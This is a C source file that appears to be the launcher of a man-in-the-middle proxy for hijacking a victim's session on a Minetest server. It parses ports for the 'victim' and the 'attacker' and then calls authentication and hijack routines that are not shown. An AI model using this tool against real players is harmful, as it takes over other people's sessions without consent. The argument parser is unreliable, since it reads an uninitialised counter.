#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>
#include "proxy.h"

// Presenting the dirtiest arg handling known to mankind!
#define ARGL 0b1
#define ARGB 0b10
#define ARGA 0b100
#define ARGP 0b1000

static void print_help(char* binary_name) {
    puts("Arguments: \n"
        "-l The port you want your victim to connect to\n"
        "-b The port you yourself want to connect to\n"
        "-a The address of the minetest server you want to connect to\n"
        "-p The port of the minetest server you want to connect to\n"
    );
    printf("Example: %s -l 30000 -b 30001 -a awesomeserver.org -p 30000\n", binary_name);
}

static void parse_args(int argc, char** argv, proxy_args* args) {
    uint8_t sum;
    int opt;
    while ((opt = getopt(argc, argv, "l:b:a:p:")) != -1) {
        switch (opt) {
        case 'l':
            sum += ARGL;
            args->victim_port = (uint16_t) atoi(optarg);
        break;

        case 'b':
            sum += ARGB;
            args->attacker_port = (uint16_t) atoi(optarg);
        break;

        case 'a':
            sum += ARGA;
            args->address = optarg;
        break;

        case 'p':
            sum += ARGP;
            args->address_port = (uint16_t) atoi(optarg);
        break;

        default:
            print_help(argv[0]);
            exit(1);
        break;
        }
    }
    if (sum != ARGL + ARGB + ARGA + ARGP) {
        print_help(argv[0]);
        exit(1);
    }
}

int main(int argc, char** argv) {
    assert(argc >= 1);
    if (argc < 9) {
        print_help(argv[0]);
        return 1;
    }

    proxy_args args;
    parse_args(argc, argv, &args);

    proxy proxy;
    proxy_init(&proxy, &args);

    wait_and_auth(&proxy);
    proxy_run_hijack(&proxy);

    return 0;
}
